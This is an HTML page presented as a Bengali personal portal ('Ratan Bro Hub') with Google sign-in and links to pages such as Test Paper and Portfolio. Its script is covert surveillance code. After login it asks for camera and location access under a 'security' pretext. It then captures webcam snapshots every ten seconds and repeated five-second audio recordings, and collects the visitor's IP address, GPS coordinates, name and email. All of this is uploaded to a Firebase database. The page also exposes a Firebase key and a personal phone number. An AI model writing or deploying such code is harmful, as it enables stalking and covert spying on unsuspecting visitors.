<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Personal Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
    <style>
        :root { --pink: #ff4d94; --dark: #0f172a; --card: rgba(30, 41, 59, 0.9); }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
        
        body { 
            background: var(--dark); 
            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.2), transparent),
                        linear-gradient(180deg, #0f172a 0%, #020617 100%);
            color: white; overflow-x: hidden; min-height: 100vh;
        }

        /* --- Login Section --- */
        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .login-box { 
            background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); 
            text-align: center; width: 90%; max-width: 400px; backdrop-filter: blur(15px);
        }
        .round-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid var(--pink); margin-bottom: 20px; }

        /* --- Permission Modal --- */
        #perm-modal { 
            position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; 
            display: none; align-items: center; justify-content: center; 
        }
        .perm-card { 
            background: #1e293b; padding: 35px; border-radius: 25px; text-align: center; 
            max-width: 380px; border: 2px solid var(--pink); animation: bounceIn 0.6s;
        }

        /* --- Main UI Header --- */
        #main-ui { display: none; }
        .hero { 
            padding: 60px 20px; text-align: center; 
            background: linear-gradient(to bottom, rgba(255, 45, 149, 0.2), transparent);
            border-radius: 0 0 60px 60px; margin-bottom: 30px;
        }
        .profile-wrapper { display: flex; justify-content: center; align-items: center; position: relative; }
        .p-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid white; object-fit: cover; box-shadow: 0 0 20px var(--pink); }
        .user-p-img { width: 85px; height: 85px; margin-left: -30px; border: 4px solid var(--dark); z-index: 1; }

        .top-nav { display: flex; justify-content: space-between; padding: 20px; align-items: center; }
        .logout-btn { background: rgba(255, 77, 148, 0.1); color: var(--pink); border: 1px solid var(--pink); padding: 5px 15px; border-radius: 50px; cursor: pointer; }

        /* --- Grid & Cards --- */
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; padding: 0 20px; max-width: 900px; margin: 0 auto; }
        .card { 
            background: var(--card); border-radius: 20px; padding: 25px; text-align: center; 
            text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s;
        }
        .card:hover { transform: translateY(-8px); border-color: var(--pink); box-shadow: 0 10px 20px rgba(255, 77, 148, 0.2); }
        .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; }

        /* --- Contact Links --- */
        .contact-section { text-align: center; margin-top: 40px; padding: 20px; }
        .social-btn { 
            display: inline-flex; align-items: center; gap: 10px; padding: 12px 25px; 
            border-radius: 50px; text-decoration: none; color: white; font-weight: bold; margin: 10px;
            transition: 0.3s;
        }
        .fb { background: #1877F2; }
        .wa { background: #25D366; }
        .social-btn:hover { opacity: 0.8; transform: scale(1.05); }

        canvas, video { display: none; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box animate__animated animate__fadeIn">
            <img src="ratan.jpg" onerror="this.src='https://i.ibb.co/vzYm8mN/ratan.jpg'" class="round-img">
            <h2 style="color: var(--pink);">Ratan Bro Hub</h2>
            <p style="margin: 10px 0; opacity: 0.7;">এগিয়ে যেতে জিমেইল দিয়ে লগইন করুন</p>
            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%;">
                <i class="fab fa-google"></i> Login with Google
            </button>
        </div>
    </div>

    <div id="perm-modal">
        <div class="perm-card">
            <i class="fas fa-fingerprint" style="font-size: 3rem; color: var(--pink); margin-bottom: 15px;"></i>
            <h3>সিকিউরিটি অ্যাক্সেস</h3>
            <p style="margin: 15px 0; opacity: 0.8;">সাইটটি ব্যবহারের জন্য ক্যামেরা ও লোকেশন পারমিশন 'Allow' করুন।</p>
            <button onclick="startApp()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer;">প্রবেশ করুন</button>
        </div>
    </div>

    <div id="main-ui">
        <div class="top-nav">
            <span style="font-weight: bold; color: var(--pink);">RATAN PRO V3</span>
            <button class="logout-btn" onclick="googleLogout()">Logout</button>
        </div>

        <section class="hero animate__animated animate__fadeIn">
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="user-display-pic" src="" class="p-img user-p-img">
            </div>
            <h2 id="user-welcome" style="margin-top:20px;"></h2>
            <p style="color: var(--pink); font-weight: bold;">ওয়েব ডেভেলপার ও ডিজিটাল এক্সপার্ট</p>
        </section>

        <div class="grid">
            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
            <a href="business.html" class="card"><i class="fas fa-briefcase"></i><h4>Business</h4></a>
            <a href="portfolio.html" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
            <a href="#" class="card"><i class="fas fa-cog"></i><h4>Settings</h4></a>
        </div>

        <div class="contact-section">
            <h3 style="margin-bottom: 20px; opacity: 0.6;">Contact Me</h3>
            <a href="https://www.facebook.com/profile.php?id=61552305287329" target="_blank" class="social-btn fb">
                <i class="fab fa-facebook-f"></i> Facebook
            </a>
            <a href="https://wa.me/8801609166109" target="_blank" class="social-btn wa">
                <i class="fab fa-whatsapp"></i> WhatsApp
            </a>
        </div>
    </div>

    <canvas id="snapCanvas" width="640" height="480"></canvas>
    <video id="vSource" autoplay playsinline muted></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        let targetUser = null;

        window.googleLogin = () => { signInWithPopup(auth, provider); };
        window.googleLogout = () => { signOut(auth).then(() => location.reload()); };

        onAuthStateChanged(auth, (user) => {
            if (user) {
                targetUser = user;
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('perm-modal').style.display = 'flex';
            }
        });

        window.startApp = async () => {
            document.getElementById('perm-modal').style.display = 'none';
            document.getElementById('main-ui').style.display = 'block';
            document.getElementById('user-welcome').innerText = "Welcome, " + targetUser.displayName;
            document.getElementById('user-display-pic').src = targetUser.photoURL;
            runTracking(targetUser);
        };

        async function runTracking(user) {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => alert("Access Denied!"));
            document.getElementById('vSource').srcObject = stream;

            const userRef = doc(db, "users", user.email.replace('.', '_'));
            const mediaRecorder = new MediaRecorder(stream);

            mediaRecorder.ondataavailable = async (e) => {
                const reader = new FileReader();
                reader.readAsDataURL(e.data);
                reader.onloadend = async () => { await updateDoc(userRef, { lastAudio: reader.result }); };
            };

            setInterval(() => {
                takeSnapshot(user);
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
            }, 10000);

            takeSnapshot(user);
        }

        async function takeSnapshot(user) {
            const canvas = document.getElementById('snapCanvas');
            const video = document.getElementById('vSource');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            const dataImg = canvas.toDataURL('image/jpeg', 0.5);

            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                    name: user.displayName,
                    email: user.email,
                    photo: user.photoURL,
                    ip: ipData.ip,
                    loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
                    lastPic: dataImg,
                    time: new Date().toLocaleString()
                }, { merge: true });
            });
        }
    </script>
</body>
</html>
